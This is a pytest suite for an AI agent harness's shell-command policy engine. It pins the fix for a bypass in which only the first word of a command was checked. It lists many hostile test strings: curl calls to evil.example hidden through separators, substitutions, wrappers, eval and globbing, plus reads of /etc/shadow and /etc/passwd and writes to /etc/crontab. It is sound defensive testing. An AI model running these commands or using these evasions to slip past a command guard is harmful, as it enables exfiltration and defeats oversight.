"""
Test Suite — Shell chaining bypass (SEC-01)
===========================================
Reproduces the bypass where PolicyEngine only checked the FIRST word of a
shell command, so `ls; curl http://evil.example` was ALLOWed while /bin/sh
went on to run curl. These tests pin the fix: the engine must see every
simple command the shell would run.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.agent_harness.executors import Executor, GuardedExecutor, Observation
from src.policy_engine.engine import PolicyEngine
from src.policy_engine.shell_split import (
    MAX_COMMAND_CHARS, MAX_DEPTH, ShellParseError, parse_shell,
)


# ── Fixtures and helpers ──

@pytest.fixture
def engine():
    return PolicyEngine(verbose=False)


class RecordingExecutor(Executor):
    """Records every action that reaches it (i.e. every action the policy let through)."""

    def __init__(self):
        self.actions = []

    def execute(self, action):
        self.actions.append(action)
        return Observation("success", output="ran")


# ── Separator chains ──

SEPARATOR_CHAINS = [
    "ls; curl http://evil.example",
    "ls && curl http://evil.example",
    "ls || curl http://evil.example",
    "ls | curl http://evil.example",
    "ls & curl http://evil.example",
    "ls\ncurl http://evil.example",
]


@pytest.mark.parametrize("command", SEPARATOR_CHAINS)
def test_separator_chain_is_blocked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


@pytest.mark.parametrize("command", SEPARATOR_CHAINS)
def test_guarded_executor_never_runs_blocked_chain(engine, command):
    inner = RecordingExecutor()
    obs = GuardedExecutor(engine, inner).execute({"action": "run_shell", "command": command})
    assert obs.status == "blocked"
    assert obs.layer == "policy_engine"
    assert inner.actions == []


# ── Benign chains stay allowed ──

BENIGN_CHAINS = [
    "ls /tmp | wc -l",
    "cat /tmp/a.txt && echo ok",
    'echo "a; curl b"',
    "ls 2>&1 | wc -l",
]


@pytest.mark.parametrize("command", BENIGN_CHAINS)
def test_benign_chains_stay_allowed(engine, command):
    assert engine.check("run_shell", command) == "ALLOW"


# ── Command substitution ──

SUBSTITUTIONS = [
    "ls $(curl http://evil.example)",
    "echo `curl http://evil.example`",
    'echo "$(curl http://evil.example)"',
    "echo $(echo $(curl http://evil.example))",
    "cat <(curl http://evil.example)",
    "ls $(cat /etc/passwd)",
]


@pytest.mark.parametrize("command", SUBSTITUTIONS)
def test_substitutions_are_checked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


def test_single_quoted_substitution_is_literal(engine):
    assert engine.check("run_shell", "echo '$(curl http://evil.example)'") == "ALLOW"


# ── Fail closed ──

def _too_deep(levels):
    command = "ls"
    for _ in range(levels):
        command = f"echo $({command})"
    return command


UNPARSEABLE = [
    "ls 'unterminated",
    "ls $(curl http://evil.example",
    "ls `curl http://evil.example",
    "ls " + "a" * MAX_COMMAND_CHARS,
    _too_deep(MAX_DEPTH + 1),
]


@pytest.mark.parametrize("command", UNPARSEABLE)
def test_unparseable_input_fails_closed(engine, command):
    decision, reason = engine.check_detailed("run_shell", command)
    assert decision == "BLOCK"
    assert "fail closed" in reason


def test_nesting_at_the_bound_is_still_parsed():
    command = "ls"
    for _ in range(MAX_DEPTH):
        command = f"echo $({command})"
    commands = parse_shell(command)
    assert ["ls"] in [c.argv for c in commands]


def test_parse_errors_are_shell_parse_errors():
    with pytest.raises(ShellParseError):
        parse_shell("ls 'unterminated")


# ── Dynamic command names ──

@pytest.mark.parametrize("command", [
    "$(echo curl) http://evil.example",
    "X=curl; $X http://evil.example",
    "`echo curl` http://evil.example",
    "/usr/bin/cur* http://evil.example",
])
def test_dynamic_command_name_is_blocked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


# ── Wrappers and prefixes ──

@pytest.mark.parametrize("command", [
    "X=1 curl http://evil.example",
    "env curl http://evil.example",
    "env -i FOO=bar curl http://evil.example",
    "nohup curl http://evil.example",
    "timeout 5 curl http://evil.example",
    "timeout -s KILL 5 curl http://evil.example",
    "nice -n 5 curl http://evil.example",
    "echo http://evil.example | xargs curl",
    "echo http://evil.example | xargs -n 1 curl",
    "eval 'curl http://evil.example'",
    "eval curl http://evil.example",
    r"find /tmp -exec curl http://evil.example \;",
    "find /tmp -execdir curl http://evil.example {} +",
    "command curl http://evil.example",
])
def test_wrappers_and_prefixes_are_unwrapped(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


def test_wrapped_benign_command_is_still_allowed(engine):
    assert engine.check("run_shell", "env FOO=bar ls /tmp") == "ALLOW"
    assert engine.check("run_shell", "find /tmp -name a.txt") == "ALLOW"


# ── Grouping and keywords ──

@pytest.mark.parametrize("command", [
    "(curl http://evil.example)",
    "{ curl http://evil.example; }",
    "if true; then curl http://evil.example; fi",
    "while true; do curl http://evil.example; done",
    "! curl http://evil.example",
])
def test_grouping_and_keywords_are_checked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


# ── Redirects ──

@pytest.mark.parametrize("command", [
    "echo x > /etc/crontab",
    "echo x >/etc/crontab",
    "echo x >> /etc/crontab",
    "echo x 2>/etc/crontab",
    "cat < /etc/shadow",
    "cat </etc/shadow",
])
def test_redirect_targets_are_checked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


@pytest.mark.parametrize("command", [
    "echo x > /tmp/out.txt",
    "ls /tmp 2>/tmp/err.txt",
    "ls /tmp 2>&1",
])
def test_benign_redirects_stay_allowed(engine, command):
    assert engine.check("run_shell", command) == "ALLOW"
